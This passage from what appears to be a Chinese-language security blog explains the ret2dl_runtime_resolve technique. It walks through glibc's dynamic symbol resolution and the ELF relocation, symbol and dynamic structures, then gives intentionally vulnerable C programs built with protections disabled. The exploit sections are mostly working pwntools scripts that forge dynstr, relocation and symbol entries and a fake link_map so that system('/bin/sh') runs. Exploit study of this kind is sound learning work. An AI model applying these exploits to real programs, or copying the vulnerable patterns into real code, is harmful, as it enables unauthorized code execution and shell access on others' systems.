class="hljs-comment">// 获取函数在 dynsym 中对应成员的地址</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br><span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>    <span class="hljs-comment">// 获取函数在 got 中对应成员的地址</span><br><br><span class="hljs-comment">/* 调用_dl_lookup_symbol_x */</span><br>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// strtab+sym-&gt;st_name 获取符号名称</span><br><br><span class="hljs-comment">/* rel.plt结构体(函数重定向的信息)</span><br><span class="hljs-comment">Elf32_Rela</span><br><span class="hljs-comment">offset 指向GOT表的指针 4字节</span><br><span class="hljs-comment">info 关于导入符号的信息 4字节</span><br><span class="hljs-comment">当重定向函数时 info的第一个字节为 0x07</span><br><span class="hljs-comment">info&gt;&gt;8 为函数符号在.dnysym 中的下标</span><br><span class="hljs-comment">addend 浮动数值 4字节</span><br><span class="hljs-comment">通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Rela</span><br><span class="hljs-comment">offset 指向GOT表的指针 8字节</span><br><span class="hljs-comment">info 关于导入符号的信息 8字节</span><br><span class="hljs-comment">当重定向函数时 info的 前4字节 为 0x07</span><br><span class="hljs-comment">info的后4字节为函数符号在 .dnysym 中的下标</span><br><span class="hljs-comment">addend 浮动数值 8字节</span><br><span class="hljs-comment">通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dynsym结构体 </span><br><span class="hljs-comment">Elf32_Sym</span><br><span class="hljs-comment">name 对于.dnystr 的偏移 4字节</span><br><span class="hljs-comment">value 4字节</span><br><span class="hljs-comment">如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL</span><br><span class="hljs-comment">当成员是用来描述函数时 value为0</span><br><span class="hljs-comment">size 4字节</span><br><span class="hljs-comment">符号大小</span><br><span class="hljs-comment">当成员是用来描述函数时 size为0</span><br><span class="hljs-comment">info 符号的信息 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 info为0x12</span><br><span class="hljs-comment">other 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 other为0</span><br><span class="hljs-comment">shndx 2字节</span><br><span class="hljs-comment">绑定section的索引号</span><br><span class="hljs-comment">当成员是用来描述函数时 shndx 为0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Sym</span><br><span class="hljs-comment">name 对于.dnystr的偏移 4字节</span><br><span class="hljs-comment">info 符号的信息 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 info为0x12</span><br><span class="hljs-comment">other 显示形式 1字节</span><br><span class="hljs-comment">描述函数时 other为0</span><br><span class="hljs-comment">shndx 绑定的section的索引号 2字节</span><br><span class="hljs-comment">描述函数时 shndx 为0</span><br><span class="hljs-comment">value 8字节</span><br><span class="hljs-comment">如果这个符号被导出，则存有这个导出函数的got地址-8，否则为NULL</span><br><span class="hljs-comment">当成员是用来描述函数时 value为0</span><br><span class="hljs-comment">size 8字节</span><br><span class="hljs-comment">符号大小</span><br><span class="hljs-comment">当成员是用来描述函数时 size为0</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dynamic结构体</span><br><span class="hljs-comment">Elf32_Dyn</span><br><span class="hljs-comment">tag 指定结构用来描述的段类型  4字节</span><br><span class="hljs-comment">val/ptr  4字节</span><br><span class="hljs-comment">当用来描述某个段的地址时使用 ptr</span><br><span class="hljs-comment">其余情况使用val</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Dyn</span><br><span class="hljs-comment">tag 指定结构用来描述的段类型  4字节</span><br><span class="hljs-comment">val/ptr 8字节</span><br><span class="hljs-comment">当用来描述某个段的地址时使用 ptr</span><br><span class="hljs-comment">其余情况使用val</span><br><span class="hljs-comment">tag可选值：</span><br><span class="hljs-comment">    #define DT_NULL 0              标记动态部分的结束</span><br><span class="hljs-comment">    #define DT_NEEDED 1            所需库的名称</span><br><span class="hljs-comment">    #define DT_PLTRELSZ 2          PLT 重定位的字节大小</span><br><span class="hljs-comment">    #define DT_PLTGOT 3            处理器定义的值</span><br><span class="hljs-comment">    #define DT_HASH 4              符号哈希表地址</span><br><span class="hljs-comment">    #define DT_STRTAB 5            字符串表地址</span><br><span class="hljs-comment">    #define DT_SYMTAB 6            符号表地址</span><br><span class="hljs-comment">    #define DT_RELA7               Rela relocs地址</span><br><span class="hljs-comment">    #define DT_RELASZ 8            Rela reloc 的总大小</span><br><span class="hljs-comment">    #define DT_RELAENT 9           一个 Rela reloc 的大小</span><br><span class="hljs-comment">    #define DT_STRSZ 10            字符串表的大小</span><br><span class="hljs-comment">    #define DT_SYMENT 11           一个符号表的大小入口</span><br><span class="hljs-comment">    #define DT_INIT 12             init 函数的地址</span><br><span class="hljs-comment">    #define DT_FINI 13             储存fini函数的指针地址(会在exit中执行)</span><br><span class="hljs-comment">    #define DT_SONAME 14           共享对象的名称</span><br><span class="hljs-comment">    #define DT_RPATH 15            库搜索路径（不推荐使用）</span><br><span class="hljs-comment">    #define DT_SYMBOLIC 16         从这里开始符号搜索</span><br><span class="hljs-comment">    #define DT_REL 17              Rel reloc 的地址</span><br><span class="hljs-comment">    #define DT_RELSZ 18            Rel reloc 的总大小</span><br><span class="hljs-comment">    #define DT_RELENT 19           一个 Rel reloc 的大小</span><br><span class="hljs-comment">    #define DT_PLTREL 20           PLT 中的 reloc 类型</span><br><span class="hljs-comment">    #define DT_DEBUG 21            用于调试；unspecified</span><br><span class="hljs-comment">    #define DT_TEXTREL 22          Reloc 可能会修改 .text</span><br><span class="hljs-comment">    #define DT_JMPREL 23           PLT relocs 的地址</span><br><span class="hljs-comment">    #define DT_BIND_NOW 24         对象的进程重定位</span><br><span class="hljs-comment">    #define DT_INIT_ARRAY 25       带有 init fct 地址的数组</span><br><span class="hljs-comment">    #define DT_FINI_ARRAY 26       带有 fini fct 地址的数组</span><br><span class="hljs-comment">    #define DT_INIT_ARRAYSZ 27     以字节为单位的大小DT_INIT_ARRAY</span><br><span class="hljs-comment">    #define DT_FINI_ARRAYSZ 28     DT_FINI_ARRAY 的字节大小</span><br><span class="hljs-comment">    #define DT_RUNPATH 29          库搜索路径</span><br><span class="hljs-comment">    #define DT_FLAGS 30            正在加载的对象的标志</span><br><span class="hljs-comment">    #define DT_ENCODING 32         编码开始range</span><br><span class="hljs-comment">    #define DT_PREINIT_ARRAY 32    带有 preinit fct 地址的数组</span><br><span class="hljs-comment">    #define DT_PREINIT_ARRAYSZ 33  DT_PREINIT_ARRAY 的字节大小</span><br><span class="hljs-comment">    #define DT_NUM 34              使用的数量</span><br><span class="hljs-comment">    #define DT_LOOS 0x6000000d     操作系统特定的开始</span><br><span class="hljs-comment">    #define DT_HIOS 0x6ffff000     操作系统特定的结束</span><br><span class="hljs-comment">    #define DT_LOPROC 0x70000000   处理器特定的开始</span><br><span class="hljs-comment">    #define DT_HIPROC 0x7fffffff   处理器特定的结束</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dnystr段结构 </span><br><span class="hljs-comment">    开头第一个字节为\x00,后面储存的每个符号的名称，以\x00结尾</span><br><span class="hljs-comment">*/</span><br>    <br></code></pre></td></tr></table></figure><p><code>_dl_lookup_symbol_x</code>在<code>elf/dl-lookup.c</code>文件中，传入7个参数，分别是 <code>符号名称</code>，<code>link_map</code>，<code>符号在dnysym中对应成员的地址</code>，<code>link_map引用的符号表</code>(里面是保存了用于引用的<code>link_map结构体</code>信息)，<code>版本</code>，<code>符号类型</code>，<code>符号版本信息</code>，<code>跳过的link_map</code>(不查找这个文件中的符号) ，遍历<code>scope</code>中的结构体，排除跳过的<code>link_map</code>，使用 <code>do_lookup_x</code> 从剩余的<code>link_map</code>中搜索符号，当搜索到符号时，返回结构体<code>&#123;符号地址,当前link_map&#125;</code></p><p><code>do_lookup_x</code>在<code>elf/dl-lookup.c</code>文件中，传入13个参数，主要流程为，循环遍历当前<code>link_map</code>表示的文件及其引用的文件中的符号，通过遍历对比文件中的符号名称与传入<code>_dl_lookup_symbol_x</code>的符号名称，来搜索符号，当搜索到符号时，返回 <code>&#123;符号地址,符号所属link_map&#125;</code></p><h2 id="修改dynamic">修改dynamic</h2><blockquote><p>从 <code>_dl_fixup</code> 中的代码中可以看出，程序获取段地址，是通过<code>dynamic段</code>中储存的结构体获取的<br>原本<code>dynamic段</code>中<code>DT_STRTAB</code>的<code>ptr</code>字段储存的是 程序<code>dnystr段</code>的地址，程序在进行绑定操作时，会通过<code>dnystr段</code>获取符号名称<br>当我们将<code>dynamic段</code>中的<code>DT_STARTAB</code>的<code>ptr</code>字段储存的数据修改为我们伪造的<code>dnystr段</code>地址时，<br>程序在第一次调用库中的函数时，通过<code>_dl_runtime_resolve</code>的绑定操作，从我们伪造的<code>dnystr段</code>中获取符号名称，从库中导出对应的符号,并执行我们构造的函数<br>这种利用方法需要程序关闭了 <code>ROLRO保护</code>，否则<code>.dynamic</code> 段不可写，也就无法达到攻击的效果了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> cache[<span class="hljs-number">0x30</span>]=&#123;&#125;;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> state=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">0x40</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,cache,<span class="hljs-number">0x50</span>);<br>    c[read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x10</span>)<span class="hljs-number">-1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *a=atoi(c);<br>    c[read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x10</span>)<span class="hljs-number">-1</span>]=<span class="hljs-number">0</span>;<br>    *a=atoi(c);<br>    <span class="hljs-built_in">exit</span>(state);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -z norelro -no-pie pwn_resolve.c -o pwn_resolve</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-2.jpg" srcset="/img/loading.gif" lazyload alt="bss段布局" title="bss段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-3.jpg" srcset="/img/loading.gif" lazyload alt="dynamic段布局" title="dynamic段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-4.jpg" srcset="/img/loading.gif" lazyload alt="dynstr段布局" title="dynstr段布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    设置 dynamic段 中 dynstr段 的地址为  bss段 中构造的 &quot;\x00system\x00&quot; 字符串的地址</span><br><span class="hljs-string">    并设置 state 为 bss段 中构造的 &quot;/bin/sh&quot; 字符串的地址</span><br><span class="hljs-string">    在执行 exit 函数时 经过 _dl_runtime_resolve 就会搜索 system 函数并执行 system(&quot;/bin/sh&quot;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwn_resolve&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&quot;system\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x4033c0</span>)<br>p.sendline(payload)<br>pause()<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4031e0</span>))<br>pause()<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4033c7</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="伪造reloc-offset">伪造reloc_offset</h2><blockquote><p>从<code>_dl_fixup</code>中的代码可以看出，程序获取与函数对应的<code>rel.plt表项</code> <code>reloc</code>是通过<code>reloc_offset</code>参数<br>获取对应的<code>dnysym表项</code> <code>sym</code>是通过<code>reloc.r_info</code> ，获取<code>dnystr</code>对应的名称是通过<code>sym</code><br>所以只要伪造了<code>reloc_offset</code> 参数，就可以伪造<code>reloc</code>，进而伪造 <code>sym</code> 与 <code>dnystr</code>中对应的名称<br>然后就会调用我们伪造的<code>dnystr</code>中的函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> cache[<span class="hljs-number">0x50</span>]=&#123;&#125;;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> state=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">0x40</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,cache,<span class="hljs-number">0x70</span>);<br>    read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x70</span>);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -fno-stack-protector -no-pie pwn_resolve.c -o pwn_resolve</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-2.jpg" srcset="/img/loading.gif" lazyload alt="bss段布局" title="bss段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-3.jpg" srcset="/img/loading.gif" lazyload alt=".dynamic段布局" title=".dynamic段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-4.jpg" srcset="/img/loading.gif" lazyload alt="dynsym段布局" title="dynsym段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-5.jpg" srcset="/img/loading.gif" lazyload alt="dynstr段布局" title="dynstr段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-6.jpg" srcset="/img/loading.gif" lazyload alt="rel.plt段布局" title="rel.plt段布局"></p><p><code>rel表项</code>需要构造 {对应<code>got表</code>地址(8字节), <code>sym表</code>中的索引值(4字节), 用来表示函数的<code>7</code>(4字节), <code>addend</code>用处未知一般为<code>0</code>(4字节)}</p><p><code>sym表项</code>需要构造 {<code>dnystr</code>中的索引值(4字节), 用来表示函数的<code>12</code>(1字节), <code>other</code>描述函数时为<code>0</code>(1字节), <code>shndx</code>描述函数时为0(2字节), <code>value</code>在函数被导出前为<code>0</code>(4字节), <code>size</code>描述函数时为<code>0</code>(4字节)}</p><p><code>dnystr表项</code>构造时只需要在字符串结尾使用<code>\x00</code>截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    构造 全局变量cache ,将 sym表项 与 rel表项 ，dynstr表项 都伪造好，</span><br><span class="hljs-string">    通过传入一个较大的 rel.plt表 索引值,</span><br><span class="hljs-string">    使其索引到我们伪造的表项,进而导出 system 函数，并执行 system 函数</span><br><span class="hljs-string">  需要计算rel的索引值和sym的索引值，还有system字符串在dynstr的索引值</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>rdi=<span class="hljs-number">0x00000000004012a3</span><br>p=process(<span class="hljs-string">&#x27;./pwn_resolve&#x27;</span>)<br>sym=p32(<span class="hljs-number">0x4040b9</span>-<span class="hljs-number">0x4004a0</span>)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> <span class="hljs-comment"># 0x4004a0为.dynstr表的地址 0x4040b9为system字符串位置</span><br>rel=p64(<span class="hljs-number">0x404018</span>)+p32(<span class="hljs-number">7</span>)+p64((<span class="hljs-number">0x404088</span>-<span class="hljs-number">0x4003e0</span>)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># 0x4003e0为sym表的地址 0x404088为伪造的sym表项的地址</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+sym+rel+<span class="hljs-string">&quot;\x00system\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x4033c0</span>)<br>p.send(payload)<br>pause()<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi)+p64(<span class="hljs-number">0x404080</span>)+p64(<span class="hljs-number">0x401020</span>)+p64((<span class="hljs-number">0x4040a0</span>-<span class="hljs-number">0x4005a8</span>)//<span class="hljs-number">0x18</span>)) <span class="hljs-comment"># 0x4005a8是rel表的地址 0x4040a0为伪造的rel表项的地址</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="伪造link-map">伪造link_map</h2><blockquote><p>这种方法需要先获取描述当前程序的<code>link_map</code>结构体的<code>scope</code>成员中储存的数据<br>想要获取<code>scope</code>成员中的数据，至少需要达到任意地址读取，这种情况下已经可以泄露libc的地址<br>而想要利用<code>ret2resolve</code>则需要控制程序流程<br>这种情况下，已知<code>libc</code>地址，且可以控制程序，直接执行<code>system(&quot;/bin/sh&quot;);</code>就可以了<br>想要利用<code>link_map</code>还需要 至少<code>0x400</code>的空间，<br>这种情况下，想要伪造<code>link_map</code>,达到<code>ret2dlresolve</code>的目的，利用难度较高<br>如果作为栈溢出的利用</p></blockquote><blockquote><p>以下是我尝试伪造<code>link_map</code>的代码,比较极端地允许输入任意长度的数据</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> a[<span class="hljs-number">4096</span>]=&#123;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> b[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start\naddr: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-type">int</span>)a);<br>    gets(b);<br>    gets(a);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;123123&quot;</span>);<br><br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -fno-stack-protector -no-pie 1.c</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp 0x401201&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;addr: &#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>fake_dyn=d+<span class="hljs-number">0x300</span><br>fake_map=p64(<span class="hljs-number">0</span>)+p64(d)+p64(fake_dyn)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(d)+p64(<span class="hljs-number">0</span>)+p64(d)<br>fake_info=p64(<span class="hljs-number">0</span>)+p64(fake_dyn)+p64(<span class="hljs-number">0x403f00</span>)+p64(fake_dyn+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_dyn+<span class="hljs-number">0x20</span>)+p64(fake_dyn+<span class="hljs-number">0x30</span>)+p64(fake_dyn+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0x403f40</span>)+\<br>        p64(<span class="hljs-number">0x403f50</span>)+p64(<span class="hljs-number">0x403ec0</span>)+p64(<span class="hljs-number">0x403ed0</span>)+p64(<span class="hljs-number">0x403e30</span>)+p64(<span class="hljs-number">0x403e40</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0x403f10</span>)+p64(<span class="hljs-number">0x403ee0</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_dyn+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x403e50</span>)+\<br>        p64(<span class="hljs-number">0x403e70</span>)+p64(<span class="hljs-number">0x403e60</span>)+p64(<span class="hljs-number">0x403e80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0x403f70</span>)+p64(<span class="hljs-number">0x403f60</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">14</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">25</span>+p64(<span class="hljs-number">0x403e90</span>)<br>seg=d+<span class="hljs-number">0x500</span><br>got=seg<br>strtab=seg+<span class="hljs-number">0x100</span><br>symtab=seg+<span class="hljs-number">0x200</span><br>reltab=seg+<span class="hljs-number">0x300</span><br>jmprel=seg+<span class="hljs-number">0x400</span><br>fake_map=fake_map+fake_info<br>fake_map=fake_map.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(fake_map)))<br>dyn_sym=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">24</span>)+p64(<span class="hljs-number">3</span>)+p64(got)+p64(<span class="hljs-number">5</span>)+p64(strtab)+p64(<span class="hljs-number">6</span>)+p64(symtab)+p64(<span class="hljs-number">7</span>)+p64(reltab)+p64(<span class="hljs-number">0x17</span>)+p64(jmprel)<br>dyn_sym=dyn_sym.ljust(<span class="hljs-number">0x98</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_map=fake_map+dyn_sym<br>nnn=<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>fake_map=fake_map+p64(nnn)<br><span class="hljs-comment">#因为只是测试，所以直接用gdb获取scope的值，然后输入就可以了</span><br>fake_map=fake_map.ljust(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>got_d=p64(<span class="hljs-number">0x405068</span>)<br>got_d=got_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>strtab_d=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&quot;system\x00&quot;</span><br>strtab_d=strtab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>symtab_d=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p32(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0x12</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)<br>symtab_d=symtab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>reltab_d=p64(<span class="hljs-number">0</span>)<br>reltab_d=reltab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>jmprel_d=p64(got)+p32(<span class="hljs-number">7</span>)+p64(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">1</span>)<br>jmprel_d=jmprel_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>fake_map=fake_map + got_d + strtab_d + symtab_d + reltab_d + jmprel_d<br>bin_sh=<span class="hljs-built_in">len</span>(fake_map)+<span class="hljs-number">0x40</span><br>fake_map=fake_map.ljust(bin_sh,<span 